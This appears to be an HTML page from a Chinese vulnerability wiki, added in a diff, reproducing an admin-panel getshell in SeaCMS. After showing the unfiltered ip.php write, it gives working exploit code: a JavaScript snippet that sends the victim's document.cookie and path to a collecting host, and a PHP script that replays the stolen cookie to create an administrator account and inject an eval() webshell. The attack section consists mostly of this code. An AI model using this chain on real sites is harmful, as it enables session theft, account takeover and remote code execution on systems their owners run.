@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Seacms/Seacms%20%E5%90%8E%E5%8F%B0getshell/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>seacms getshell - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "seacms getshell", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Secnet%E5%AE%89%E7%BD%91/Secnet%E5%AE%89%E7%BD%91%E6%99%BA%E8%83%BDAC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Factpt_5g%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Secnet%E5%AE%89%E7%BD%91/Secnet%E5%AE%89%E7%BD%91%E6%99%BA%E8%83%BDAC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Factpt_5g%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="btn btn-xs btn-link">
+        Secnet安网 智能AC管理系统 actpt_5g 信息泄露
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Seacms%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Seacms%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="btn btn-xs btn-link">
+        Seacms 储存型xss
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="seacms-getshell">seacms getshell<a class="headerlink" href="#seacms-getshell" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>海洋cms是一款简单的php内容管理系统，主要用于视频网站，采用PHP+MYSQL架构，未使用框架</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>后台代码如下</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+
+<span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Content-Type:text/html;charset=utf-8&#39;</span><span class="p">);</span>
+
+<span class="k">require_once</span><span class="p">(</span><span class="nb">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;/config.php&quot;</span><span class="p">);</span>
+
+<span class="nx">CheckPurview</span><span class="p">();</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$action</span><span class="o">==</span><span class="s2">&quot;set&quot;</span><span class="p">)</span>
+
+<span class="p">{</span>
+
+    <span class="nv">$v</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v&#39;</span><span class="p">];</span>
+
+    <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">];</span>
+
+    <span class="nv">$open</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;../data/admin/ip.php&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span> <span class="p">);</span>
+
+    <span class="nv">$str</span><span class="o">=</span><span class="s1">&#39;&lt;?php &#39;</span><span class="p">;</span>
+
+    <span class="nv">$str</span><span class="o">.=</span><span class="s1">&#39;$v = &quot;&#39;</span><span class="p">;</span>
+
+    <span class="nv">$str</span><span class="o">.=</span><span class="s2">&quot;</span><span class="si">$v</span><span class="s2">&quot;</span><span class="p">;</span>
+
+    <span class="nv">$str</span><span class="o">.=</span><span class="s1">&#39;&quot;; &#39;</span><span class="p">;</span>
+
+    <span class="nv">$str</span><span class="o">.=</span><span class="s1">&#39;$ip = &quot;&#39;</span><span class="p">;</span>
+
+    <span class="nv">$str</span><span class="o">.=</span><span class="s2">&quot;</span><span class="si">$ip</span><span class="s2">&quot;</span><span class="p">;</span>
+
+    <span class="nv">$str</span><span class="o">.=</span><span class="s1">&#39;&quot;; &#39;</span><span class="p">;</span>
+
+    <span class="nv">$str</span><span class="o">.=</span><span class="s2">&quot; ?&gt;&quot;</span><span class="p">;</span>
+
+    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$open</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
+
+    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$open</span><span class="p">);</span>
+
+    <span class="nx">ShowMsg</span><span class="p">(</span><span class="s2">&quot;成功保存设置!&quot;</span><span class="p">,</span><span class="s2">&quot;admin_ip.php&quot;</span><span class="p">);</span>
+
+    <span class="k">exit</span><span class="p">;</span>
+
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div>
+
+<p>这里根本没有经过过滤，直接将变量写进去，可以写一个脚本利用</p>
+<p>代码如下</p>
+<div class="codehilite"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="n">test</span><span class="p">.</span><span class="n">js</span>
+
+<span class="nf">var</span><span class="w"> </span><span class="n">img</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="nc">Image</span><span class="p">();</span>
+
+<span class="n">img</span><span class="p">.</span><span class="n">src</span><span class="o">=</span><span class="w">  </span><span class="ss">&quot;http://127.0.0.1/test.php?x=&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">document</span><span class="p">.</span><span class="n">cookie</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="ss">&quot;&amp;p=&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">location</span><span class="p">.</span><span class="n">pathname</span><span class="p">;</span>
+
+<span class="err">#</span><span class="w"> </span><span class="n">test</span><span class="p">.</span><span class="n">php</span>
+
+<span class="o">&lt;</span><span class="vm">?</span><span class="n">php</span>
+
+<span class="w">    </span><span class="k">function</span><span class="w"> </span><span class="n">Requests</span><span class="p">(</span><span class="err">$</span><span class="n">url</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="k">data</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">cookie</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="err">{</span>
+
+<span class="w">        </span><span class="err">$</span><span class="n">ch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">curl_init</span><span class="p">();</span>
+
+<span class="w">        </span><span class="err">$</span><span class="n">params</span><span class="o">[</span><span class="n">CURLOPT_URL</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">url</span><span class="p">;</span>
+
+<span class="w">           </span><span class="err">$</span><span class="n">params</span><span class="o">[</span><span class="n">CURLOPT_HEADER</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">FALSE</span><span class="p">;</span>
+
+<span class="w">        </span><span class="err">$</span><span class="n">params</span><span class="o">[</span><span class="n">CURLOPT_SSL_VERIFYPEER</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">false</span><span class="p">;</span>
+
+<span class="w">        </span><span class="err">$</span><span class="n">params</span><span class="o">[</span><span class="n">CURLOPT_SSL_VERIFYHOST</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">false</span><span class="p">;</span>
+
+<span class="w">        </span><span class="err">$</span><span class="n">params</span><span class="o">[</span><span class="n">CURLOPT_RETURNTRANSFER</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span><span class="p">;</span>
+
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">type</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
+
+<span class="w">            </span><span class="err">$</span><span class="n">params</span><span class="o">[</span><span class="n">CURLOPT_POST</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span><span class="p">;</span>
+
+<span class="w">            </span><span class="err">$</span><span class="n">params</span><span class="o">[</span><span class="n">CURLOPT_POSTFIELDS</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="k">data</span><span class="p">;</span>
+
+<span class="w">        </span><span class="err">}</span>
+
+<span class="w">        </span><span class="err">$</span><span class="n">params</span><span class="o">[</span><span class="n">CURLOPT_COOKIE</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">cookie</span><span class="p">;</span>
+
+<span class="w">        </span><span class="n">curl_setopt_array</span><span class="p">(</span><span class="err">$</span><span class="n">ch</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">params</span><span class="p">);</span>
+
+<span class="w">        </span><span class="err">$</span><span class="k">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">curl_exec</span><span class="p">(</span><span class="err">$</span><span class="n">ch</span><span class="p">);</span>
+
+<span class="w">        </span><span class="n">file_put_contents</span><span class="p">(</span><span class="s1">&#39;log.txt&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="k">output</span><span class="p">,</span><span class="w"> </span><span class="n">FILE_APPEND</span><span class="p">);</span>
+
+<span class="w">        </span><span class="n">curl_close</span><span class="p">(</span><span class="err">$</span><span class="n">ch</span><span class="p">);</span>
+
+<span class="w">    </span><span class="err">}</span>
+
+<span class="w">    </span><span class="err">$</span><span class="n">C</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">_GET</span><span class="o">[</span><span class="n">&#39;x&#39;</span><span class="o">]</span><span class="p">;</span>
+
+<span class="w">    </span><span class="err">$</span><span class="n">P</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">_GET</span><span class="o">[</span><span class="n">&#39;p&#39;</span><span class="o">]</span><span class="p">;</span>
+
+<span class="w">    </span><span class="err">$</span><span class="n">P</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="err">$</span><span class="n">P</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="err">$</span><span class="n">P</span><span class="p">)</span><span class="o">-</span><span class="mi">21</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">file_put_contents</span><span class="p">(</span><span class="s1">&#39;c.txt&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">C</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">file_put_contents</span><span class="p">(</span><span class="s1">&#39;p.txt&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">P</span><span class="p">);</span>
+
+<span class="w">    </span><span class="err">$</span><span class="n">url_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;http://192.168.113.128&#39;</span><span class="p">.</span><span class="err">$</span><span class="n">P</span><span class="p">.</span><span class="s1">&#39;admin_manager.php?action=add&#39;</span><span class="p">;</span>
+
+<span class="w">    </span><span class="err">$</span><span class="n">url_2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;http://192.168.113.128&#39;</span><span class="p">.</span><span class="err">$</span><span class="n">P</span><span class="p">.</span><span class="s1">&#39;admin_ip.php?action=set&#39;</span><span class="p">;</span>
+
+<span class="w">    </span><span class="err">$</span><span class="n">data_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;username=test&amp;pwd=test&amp;pwd2=test&amp;groupid=1&#39;</span><span class="p">;</span>
+
+<span class="w">    </span><span class="err">$</span><span class="n">data_2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;v=0&amp;ip=+&quot;;@eval($_POST[qwer]);&quot;&#39;</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">Requests</span><span class="p">(</span><span class="err">$</span><span class="n">url_1</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">data_1</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">C</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">Requests</span><span class="p">(</span><span class="err">$</span><span class="n">url_2</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">data_2</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">C</span><span class="p">);</span>
+</code></pre></div>
+
+<p>这两个脚本会将cookie和后台路径保存在文件中，并且会向后台发送数据，添加一个系统管理员，同时会在系统中写入一个一句话木马，需要注意的是修改域名为测试域名。测试如下</p>
+<p><img alt="" src="../resource/Seacms%E5%90%8E%E5%8F%B0getshell/media/rId24.png" /></p>
+<p>代码已经写进了后</p>
+<p><img alt="" src="../resource/Seacms%E5%90%8E%E5%8F%B0getshell/media/rId25.png" /></p>
+<p>管理员添加成功</p>
+<p><img alt="" src="../resource/Seacms%E5%90%8E%E5%8F%B0getshell/media/rId26.png" /></p>
+<p>\&lt;</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Secnet%E5%AE%89%E7%BD%91/Secnet%E5%AE%89%E7%BD%91%E6%99%BA%E8%83%BDAC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Factpt_5g%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Secnet%E5%AE%89%E7%BD%91/Secnet%E5%AE%89%E7%BD%91%E6%99%BA%E8%83%BDAC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Factpt_5g%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="btn btn-xs btn-link">
+        Secnet安网 智能AC管理系统 actpt_5g 信息泄露
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Seacms%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Seacms%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="btn btn-xs btn-link">
+        Seacms 储存型xss
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
